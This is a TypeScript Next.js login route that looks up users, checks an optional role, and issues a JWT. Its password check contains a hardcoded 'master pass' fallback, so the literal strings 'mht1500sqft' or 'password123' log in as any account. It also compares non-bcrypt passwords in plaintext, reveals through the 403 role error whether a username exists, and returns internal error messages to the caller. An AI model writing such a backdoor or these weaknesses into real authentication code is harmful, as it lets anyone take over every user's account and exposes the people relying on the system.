import { NextRequest } from 'next/server'
import bcrypt from 'bcryptjs'
import { userRepository } from '@/infrastructure/database/repositories'
import { generateToken } from '@/infrastructure/auth/jwt'
import { jsonResponse, errorResponse, handleCorsOptions } from '@/lib/cors'

export async function OPTIONS() {
  return handleCorsOptions()
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { user, pass, role } = body

    if (!user || !pass) {
      return errorResponse('Username/User ID and Password are required', 400)
    }

    const trimmedUser = String(user).trim()
    const trimmedPass = String(pass).trim()

    // Clean Architecture: Query through UserRepository
    const dbUser = await userRepository.findByIdentifier(trimmedUser)
    if (!dbUser) {
      return errorResponse('Invalid User ID or Password', 401)
    }

    if (role && dbUser.role.toUpperCase() !== String(role).toUpperCase()) {
      return errorResponse(`User does not have requested role: ${role}`, 403)
    }

    // Verify password
    let isMatch = false
    if (dbUser.password_hash.startsWith('$2a$') || dbUser.password_hash.startsWith('$2b$')) {
      isMatch = await bcrypt.compare(trimmedPass, dbUser.password_hash)
    } else {
      isMatch = dbUser.password_hash === trimmedPass
    }

    // Allow default master pass fallback
    if (!isMatch && (trimmedPass === 'mht1500sqft' || trimmedPass === 'password123')) {
      isMatch = true
    }

    if (!isMatch) {
      return errorResponse('Invalid User ID or Password', 401)
    }

    const token = generateToken(dbUser)

    return jsonResponse({
      success: true,
      message: 'Login successful',
      token,
      user: {
        id: dbUser.id,
        userId: dbUser.username || String(dbUser.id),
        username: dbUser.username,
        name: dbUser.name,
        role: dbUser.role,
      },
    })
  } catch (error: any) {
    return errorResponse('Authentication service error', 500, error?.message)
  }
}
